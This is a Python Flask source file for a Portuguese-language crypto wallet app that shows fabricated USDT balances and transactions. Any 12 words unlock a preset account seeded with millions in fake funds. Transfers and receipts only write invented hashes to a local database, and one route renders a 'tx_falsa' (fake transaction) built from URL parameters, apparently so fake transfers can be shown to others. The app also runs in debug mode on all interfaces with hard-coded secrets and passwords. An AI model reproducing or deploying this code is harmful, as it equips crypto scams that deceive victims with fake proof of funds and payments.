import os
import json
import requests
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, flash
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from werkzeug.security import generate_password_hash, check_password_hash
from web3 import Web3
from flask import request, render_template




app = Flask(__name__)
app.config['SECRET_KEY'] = 'sua_chave_secreta_aqui'

# --- CONFIGURAÇÃO DA BASE DE DADOS ---
basedir = os.path.abspath(os.path.dirname(__file__))
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(basedir, 'instance', 'blackwallet_v2.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# --- CONFIGURAÇÃO DO LOGIN ---
login_manager = LoginManager(app)
login_manager.login_view = 'login'

# --- CONFIGURAÇÃO TRON ---
USDT_ADDR = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'


# --- MODELOS DA BASE DE DADOS ---
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), unique=True)
    password_hash = db.Column(db.String(150))
    wallet_address = db.Column(db.String(42), unique=True)
    private_key = db.Column(db.String(100))
    balance = db.Column(db.Float, default=0.0) 
    transactions = db.relationship('Transaction', backref='user', lazy=True)

class Transaction(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    tx_hash = db.Column(db.String(100), unique=True)
    type = db.Column(db.String(20)) 
    amount = db.Column(db.String(50))
    date = db.Column(db.String(50))
    to_address = db.Column(db.String(42))
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))

@login_manager.user_loader
def load_user(user_id):
    return db.session.get(User, int(user_id))

# --- ROTAS ---
@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/unlock')
@login_required
def unlock():
    return render_template('unlock.html')

@app.route('/dashboard')
@login_required
def dashboard():
    total_usdt = current_user.balance
    endereco_visivel = current_user.wallet_address 

    transacoes = Transaction.query.filter_by(user_id=current_user.id).order_by(Transaction.id.desc()).all()
    
    chart_labels = ['Hoje']
    chart_data = [total_usdt]
    temp_balance = total_usdt

    for tx in transacoes:
        valor_str = tx.amount.replace('+', '').replace('-', '').replace('.', '').replace(',', '.')
        try:
            valor_float = float(valor_str.strip())
            if 'Recebido' in tx.type:
                temp_balance -= valor_float
            else:
                temp_balance += valor_float
            
            dia_mes = tx.date.split(',')[0] if ',' in tx.date else tx.date
            chart_labels.insert(0, dia_mes)
            chart_data.insert(0, temp_balance)
        except:
            continue

    precos = {}
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=tether,bitcoin,ethereum&vs_currencies=brl"
        headers = {'User-Agent': 'Mozilla/5.0'}
        response = requests.get(url, headers=headers, timeout=5)
        response.raise_for_status() 
        
        data = response.json()
        
        preco_usdt_brl = data['tether']['brl']
        preco_btc_brl = data['bitcoin']['brl']
        preco_eth_brl = data['ethereum']['brl']

        precos = {
            'brl': f"R$ {total_usdt * preco_usdt_brl:,.2f}".replace(',', 'X').replace('.', ',').replace('X', '.'),
            'btc': f"{(total_usdt * preco_usdt_brl) / preco_btc_brl:.6f} BTC",
            'eth': f"{(total_usdt * preco_usdt_brl) / preco_eth_brl:.6f} ETH"
        }
    except Exception as e:
        backup_usdt = 5.02      
        backup_btc = 340000.00  
        backup_eth = 18000.00   
        
        precos = {
            'brl': f"R$ {total_usdt * backup_usdt:,.2f}".replace(',', 'X').replace('.', ',').replace('X', '.'),
            'btc': f"{(total_usdt * backup_usdt) / backup_btc:.6f} BTC",
            'eth': f"{(total_usdt * backup_usdt) / backup_eth:.6f} ETH"
        }

    saldo_formatado = f"{total_usdt:,.2f}".replace(',', 'X').replace('.', ',').replace('X', '.')

    return render_template('index.html', 
                           saldo=saldo_formatado, 
                           endereco=endereco_visivel,
                           transacoes=transacoes,
                           precos=precos,
                           chart_labels=chart_labels, 
                           chart_data=chart_data)

@app.route('/transferir', methods=['GET', 'POST'])
@login_required
def transferir():
    if request.method == 'POST':
        dest = request.form.get('destino')
        val = request.form.get('quantidade')

        try:
            val_float = float(val)
            
            if val_float > current_user.balance:
                flash('Erro: Saldo insuficiente para realizar a transferência.', 'erro')
                return redirect(url_for('transferir'))

            current_user.balance -= val_float
            
            amount_formatado = f"{val_float:,.2f}".replace(',', 'X').replace('.', ',').replace('X', '.')
            
            import hashlib
            import time
            simulated_hash = hashlib.sha256(f"{dest}{val}{time.time()}".encode()).hexdigest()

            new_tx = Transaction(
                tx_hash=simulated_hash, 
                type='Enviado', 
                amount=f"- {amount_formatado}", 
                date=datetime.now().strftime("%d %b, %H:%M"), 
                to_address=dest, 
                user_id=current_user.id
            )
            db.session.add(new_tx)
            db.session.commit()

            return render_template('processing_tx.html', tx_hash=simulated_hash)
            
        except Exception as e:
            flash(f'Erro Crítico de Protocolo: {str(e)}', 'erro')

    return render_template('transfer.html', endereco=current_user.wallet_address)

# ===============================================
# AS NOVAS ROTAS ESTÃO AQUI EM BAIXO
# ===============================================

@app.route('/receber')
@login_required
def receber():
    return render_template('receive.html', endereco=current_user.wallet_address)

@app.route('/simular_recebimento/<float:valor>')
@login_required
def simular_recebimento(valor):
    try:
        current_user.balance += valor
        
        import hashlib
        import time
        simulated_hash = hashlib.sha256(f"receive{valor}{time.time()}".encode()).hexdigest()
        amount_formatado = f"{valor:,.2f}".replace(',', 'X').replace('.', ',').replace('X', '.')
        
        new_tx = Transaction(
            tx_hash=simulated_hash, 
            type='Recebido', 
            amount=f"+ {amount_formatado}", 
            date=datetime.now().strftime("%d %b, %H:%M"), 
            to_address=current_user.wallet_address, 
            user_id=current_user.id
        )
        db.session.add(new_tx)
        db.session.commit()
        
        return f"Sucesso! Foi simulado o recebimento de {valor} USDT na sua carteira. Volte para o Dashboard para ver o novo saldo."
    except Exception as e:
        return f"Erro ao adicionar saldo: {str(e)}"

@app.route('/transaction/<tx_id>')
@login_required
def transaction_details(tx_id):
    tx = Transaction.query.filter_by(tx_hash=tx_id).first()
    return render_template('details.html', tx=tx)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        words = []
        for i in range(1, 13):
            word = request.form.get(f'word{i}', '').strip()
            if word:
                words.append(word)
        
        if len(words) == 12:
            user = User.query.first() # Login to the default account
            if user:
                login_user(user)
                return redirect(url_for('unlock'))
        flash('Secret Recovery Phrase inválida. A frase deve conter exatamente 12 palavras.', 'erro')
    return render_template('login.html')

@app.route('/logout')
def logout():
    logout_user()
    return redirect(url_for('login'))


@app.route('/details')
def show_details():
    # Pega os valores da URL. Se a pessoa acessar a tela sem vir da animação, usa valores padrão
    tx_falsa = {
        "amount": request.args.get("amount", "0.00"),
        "type": "Envio Ext. (Roteamento Seguro)",
        "to_address": request.args.get("to", "TYo1xyre...abc"),
        "tx_hash": request.args.get("hash", "850c904e21a221f00a4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1a2b02cd4e5f")
    }
    
    return render_template('details.html', tx=tx_falsa)


if __name__ == '__main__':
    with app.app_context():
        db.create_all() 
        u = User.query.filter_by(username='66281966').first()
        if not u:
            u = User(username='66281966', password_hash=generate_password_hash('senha123'), wallet_address='TYo1xyrTGEzS1A4y3dD2b7M7h1o4Gv8WzP', private_key='T9yD14Nj9j7xAB4dbGeiX9h8unkKxyz123', balance=4002020.00)
            db.session.add(u)
            db.session.commit()
            
            txs = [
                Transaction(tx_hash="1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s012a3b4c5d6e7f8g9h0i1j2k3l", type='Recebido', amount="+ 30.000.000,00", date="15 Jan, 10:30", to_address=u.wallet_address, user_id=u.id),
                Transaction(tx_hash="850c904e21a221f00a4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1a2b02cd4e5f", type='Enviado', amount="- 1.500.000,00", date="28 Jan, 14:15", to_address="Txyz1...3f1", user_id=u.id)
            ]
            for t in txs:
                db.session.add(t)
            db.session.commit()
        else:
            # Força a atualização caso o banco de dados antigo não tenha sido deletado
            u.wallet_address = 'TYo1xyrTGEzS1A4y3dD2b7M7h1o4Gv8WzP'
            db.session.commit()

        u2 = User.query.filter_by(username='bonelaria').first()
        if not u2:
            u2 = User(username='bonelaria', password_hash=generate_password_hash('senha123'), wallet_address='TBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB', private_key='T11111111111111111111111111111111', balance=5000.0)
            db.session.add(u2)
            db.session.commit()

    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=True)
